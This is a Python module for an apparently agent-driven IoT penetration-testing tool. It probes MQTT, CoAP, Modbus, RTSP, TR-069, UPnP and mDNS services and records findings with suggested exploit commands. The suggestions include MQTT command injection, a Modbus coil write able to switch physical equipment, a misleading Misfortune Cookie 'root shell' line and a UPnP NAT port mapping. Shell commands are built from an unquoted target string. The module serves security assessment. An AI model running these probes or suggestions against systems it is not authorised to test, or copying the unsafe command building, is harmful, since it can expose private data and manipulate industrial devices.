"""
iot_protocol_subagent.py — IoT Protocol Security Testing

Deep-tests IoT communication protocols for security weaknesses:
  - MQTT: unauthenticated access, topic enumeration, command injection
  - CoAP: resource discovery, unauthenticated access
  - Modbus: register read/write, coil enumeration (ICS/SCADA)
  - RTSP: stream access without credentials
  - TR-069 (CWMP): ISP remote management on port 7547
  - mDNS/Bonjour: service advertisement leakage
  - UPnP SOAP injection
"""

from __future__ import annotations

import asyncio
import re
from datetime import datetime, timezone

from agents.base_subagent import BaseSubagent, Finding, SubagentResult


class IoTProtocolSubagent(BaseSubagent):
    AGENT_NAME    = "IoTAgent"
    SUBAGENT_NAME = "iot_protocol"

    async def run(self, target: str, **kwargs) -> SubagentResult:
        start = datetime.now(timezone.utc)
        self._findings.clear()
        await self._emit_start()

        open_ports: list[str] = kwargs.get("open_ports", [])
        port_set = set(str(p) for p in open_ports)

        tasks = []
        if port_set & {"1883", "8883"}:
            tasks.append(self._test_mqtt_deep(target))
        if "5683" in port_set:
            tasks.append(self._test_coap(target))
        if "502" in port_set:
            tasks.append(self._test_modbus(target))
        if "554" in port_set:
            tasks.append(self._test_rtsp(target))
        if "7547" in port_set:
            tasks.append(self._test_tr069(target))
        if port_set & {"1900"}:
            tasks.append(self._test_upnp_soap(target))
        # Always run mDNS discovery (passive)
        tasks.append(self._test_mdns(target))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

        duration = (datetime.now(timezone.utc) - start).total_seconds()
        result = SubagentResult(
            findings=self._findings,
            duration_seconds=duration,
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )
        await self._emit_complete(result)
        return result

    # ── MQTT deep test ─────────────────────────────────────────────────────────

    async def _test_mqtt_deep(self, target: str) -> None:
        # Enumerate published topics via short wildcard sub
        cmd = f"timeout 10 mosquitto_sub -h {target} -p 1883 -t '#' -v --quiet 2>&1 | head -30"
        output_lines: list[str] = []
        async for line in self.run_tool("run_command", target, {"command": cmd}):
            if self._stop_requested:
                return
            output_lines.append(line)
        raw = "\n".join(output_lines)

        if raw.strip() and "Connection refused" not in raw and "error" not in raw.lower():
            topics = [l.split(" ")[0] for l in output_lines if " " in l]
            unique_topics = list(set(topics))[:20]
            self._findings.append(Finding(
                title="MQTT Wildcard Subscription Succeeded — Topics Enumerated",
                description=(
                    f"Subscribed to all topics (#) without credentials. "
                    f"Active topics observed: {', '.join(unique_topics[:10])}. "
                    "This may expose sensor readings, GPS coordinates, control commands, "
                    "authentication tokens, and device state."
                ),
                severity="CRITICAL",
                evidence=raw[:600],
                tool="mosquitto_sub",
                host=target,
                port=1883,
                mitre_technique="T0886",
                exploit_suggestion=(
                    f"# Full enumeration:\n"
                    f"mosquitto_sub -h {target} -t '#' -v > mqtt_dump.txt &\n"
                    f"# Inject commands (if actuator topics found):\n"
                    f"mosquitto_pub -h {target} -t '<topic>' -m '<payload>'"
                ),
            ))

        # Try MQTT publish to a command-looking topic
        cmd2 = f"timeout 3 mosquitto_pub -h {target} -p 1883 -t 'test/probe' -m 'ping' 2>&1"
        out2: list[str] = []
        async for line in self.run_tool("run_command", target, {"command": cmd2}):
            out2.append(line)
        raw2 = "\n".join(out2)
        if not raw2.strip() or ("Connection refused" not in raw2 and "error" not in raw2.lower()):
            self._findings.append(Finding(
                title="MQTT Broker Allows Unauthenticated Publishing",
                description=(
                    "Successfully published a message to the MQTT broker without credentials. "
                    "An attacker can inject commands to any subscribed devices."
                ),
                severity="CRITICAL",
                evidence=raw2[:200],
                tool="mosquitto_pub",
                host=target,
                port=1883,
                exploit_suggestion=f"mosquitto_pub -h {target} -t 'device/command' -m '{{\"cmd\":\"reboot\"}}'",
            ))

    # ── CoAP ──────────────────────────────────────────────────────────────────

    async def _test_coap(self, target: str) -> None:
        cmd = f"coap-client -m get -N -B 3 coap://{target}/.well-known/core 2>&1"
        output_lines: list[str] = []
        async for line in self.run_tool("run_command", target, {"command": cmd}):
            if self._stop_requested:
                return
            output_lines.append(line)
        raw = "\n".join(output_lines)

        if raw.strip() and "timeout" not in raw.lower() and "error" not in raw.lower():
            # Parse resource paths from core link format
            resources = re.findall(r'<(/[^>]+)>', raw)
            self._findings.append(Finding(
                title=f"CoAP Resource Discovery: {len(resources)} resources exposed",
                description=(
                    f"CoAP /.well-known/core returned resource list without authentication. "
                    f"Resources: {', '.join(resources[:15])}. "
                    "CoAP has no built-in auth — all resources may be readable/writable."
                ),
                severity="HIGH",
                evidence=raw[:500],
                tool="coap-client",
                host=target,
                port=5683,
                exploit_suggestion=(
                    f"# Read each resource:\n"
                    + "\n".join(f"coap-client -m get coap://{target}{r}" for r in resources[:5])
                ),
            ))

            # Try GET on each resource
            for resource in resources[:5]:
                if self._stop_requested:
                    return
                cmd_r = f"coap-client -m get -B 3 coap://{target}{resource} 2>&1"
                r_lines: list[str] = []
                async for line in self.run_tool("run_command", target, {"command": cmd_r}):
                    r_lines.append(line)
                r_raw = "\n".join(r_lines)
                if r_raw.strip() and "4.01" not in r_raw and "4.03" not in r_raw:
                    self._findings.append(Finding(
                        title=f"CoAP Resource Readable Without Auth: {resource}",
                        description=f"CoAP GET {resource} returned data without authentication: {r_raw[:200]}",
                        severity="HIGH",
                        evidence=r_raw[:400],
                        tool="coap-client",
                        host=target,
                        port=5683,
                    ))

    # ── Modbus ────────────────────────────────────────────────────────────────

    async def _test_modbus(self, target: str) -> None:
        # Read holding registers (function code 3)
        cmd = f"mbtget -a 1 -r 1 -c 10 {target} 2>&1"
        output_lines: list[str] = []
        async for line in self.run_tool("run_command", target, {"command": cmd}):
            if self._stop_requested:
                return
            output_lines.append(line)
        raw = "\n".join(output_lines)

        if raw.strip() and "Connection refused" not in raw and "error" not in raw.lower():
            self._findings.append(Finding(
                title="Modbus Register Read Without Authentication",
                description=(
                    "Successfully read Modbus holding registers without any authentication. "
                    "Modbus has no security layer — any host on the network can read sensor "
                    "values and write to coils/registers, potentially controlling physical equipment. "
                    f"Register data: {raw[:200]}"
                ),
                severity="CRITICAL",
                evidence=raw[:500],
                tool="mbtget",
                host=target,
                port=502,
                mitre_technique="T0843",
                exploit_suggestion=(
                    f"# Read all registers:\n"
                    f"mbtget -a 1 -r 1 -c 125 {target}\n"
                    f"# Write to coil (WARNING: may control physical device):\n"
                    f"mbtget -a 1 -w 1 -v 1 {target}  # write coil 1 = ON"
                ),
            ))

    # ── RTSP ──────────────────────────────────────────────────────────────────

    async def _test_rtsp(self, target: str) -> None:
        common_paths = ["/live", "/stream", "/video1", "/cam/realmonitor", "/h264/ch1/main/av_stream", "/Streaming/Channels/101"]
        for path in common_paths:
            if self._stop_requested:
                return
            cmd = f"curl -s --max-time 5 -u '' --digest 'rtsp://{target}:554{path}' 2>&1 | head -10"
            output_lines: list[str] = []
            async for line in self.run_tool("run_command", target, {"command": cmd}):
                output_lines.append(line)
            raw = "\n".join(output_lines)
            if "200 OK" in raw or "RTSP/1.0 200" in raw:
                self._findings.append(Finding(
                    title=f"RTSP Stream Accessible Without Credentials: {path}",
                    description=(
                        f"RTSP stream at rtsp://{target}:554{path} is accessible without authentication. "
                        "Live video feed can be viewed by any network attacker."
                    ),
                    severity="HIGH",
                    evidence=raw[:300],
                    tool="curl",
                    host=target,
                    port=554,
                    exploit_suggestion=f"cvlc rtsp://{target}:554{path}\n# or: ffplay rtsp://{target}:554{path}",
                ))
                break

    # ── TR-069 (CWMP) ─────────────────────────────────────────────────────────

    async def _test_tr069(self, target: str) -> None:
        cmd = f"curl -sk --max-time 6 http://{target}:7547/ 2>&1 | head -20"
        output_lines: list[str] = []
        async for line in self.run_tool("run_command", target, {"command": cmd}):
            output_lines.append(line)
        raw = "\n".join(output_lines)
        if raw.strip() and "Connection refused" not in raw:
            self._findings.append(Finding(
                title="TR-069 (CWMP) Remote Management Port Exposed (7547)",
                description=(
                    "TR-069/CWMP is the ISP remote management protocol. "
                    "Exposure to untrusted networks allows malicious ACS servers to reprogram devices. "
                    "CVE-2014-9222 (Misfortune Cookie) and similar bugs apply here."
                ),
                severity="CRITICAL",
                evidence=raw[:300],
                tool="curl",
                host=target,
                port=7547,
                cve="CVE-2014-9222",
                exploit_suggestion=(
                    f"searchsploit CWMP\n"
                    f"# Misfortune Cookie: send malformed cookie to get root shell\n"
                    f"curl -H 'Cookie: C107373883' http://{target}:7547/"
                ),
            ))

    # ── UPnP SOAP injection ────────────────────────────────────────────────────

    async def _test_upnp_soap(self, target: str) -> None:
        soap_body = (
            '<?xml version="1.0"?>'
            '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
            's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
            '<s:Body>'
            '<u:GetExternalIPAddress xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"/>'
            '</s:Body></s:Envelope>'
        )
        cmd = (
            f"curl -s --max-time 5 -X POST "
            f"-H 'Content-Type: text/xml' "
            f"-H 'SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress\"' "
            f"-d '{soap_body}' "
            f"http://{target}:49152/upnp/control/WANIPConn1 2>&1 | head -20"
        )
        output_lines: list[str] = []
        async for line in self.run_tool("run_command", target, {"command": cmd}):
            output_lines.append(line)
        raw = "\n".join(output_lines)
        if "NewExternalIPAddress" in raw or "200" in raw:
            ip_m = re.search(r'<NewExternalIPAddress>(.*?)</NewExternalIPAddress>', raw)
            ext_ip = ip_m.group(1) if ip_m else "unknown"
            self._findings.append(Finding(
                title="UPnP WANIPConnection SOAP API Exposed",
                description=(
                    f"UPnP SOAP action GetExternalIPAddress succeeded. External IP: {ext_ip}. "
                    "Attacker can use AddPortMapping to open arbitrary ports through NAT "
                    "(classic UPnP attack to bypass firewall)."
                ),
                severity="HIGH",
                evidence=raw[:400],
                tool="curl",
                host=target,
                exploit_suggestion=(
                    f"# Add port mapping (expose internal service externally):\n"
                    f"upnp-portmap add {target} 8888 192.168.1.100 22 tcp 'ssh tunnel'"
                ),
            ))

    # ── mDNS ──────────────────────────────────────────────────────────────────

    async def _test_mdns(self, target: str) -> None:
        cmd = f"avahi-browse -a -t --no-fail 2>/dev/null | grep -i '{target}' | head -20"
        output_lines: list[str] = []
        async for line in self.run_tool("run_command", target, {"command": cmd}):
            output_lines.append(line)
        raw = "\n".join(output_lines)
        if raw.strip():
            self._findings.append(Finding(
                title="mDNS/Bonjour Service Advertisements Detected",
                description=(
                    f"Device at {target} is advertising services via mDNS/Bonjour: {raw[:200]}. "
                    "mDNS leaks device type, OS, and running services to any LAN host."
                ),
                severity="LOW",
                evidence=raw[:300],
                tool="avahi-browse",
                host=target,
            ))
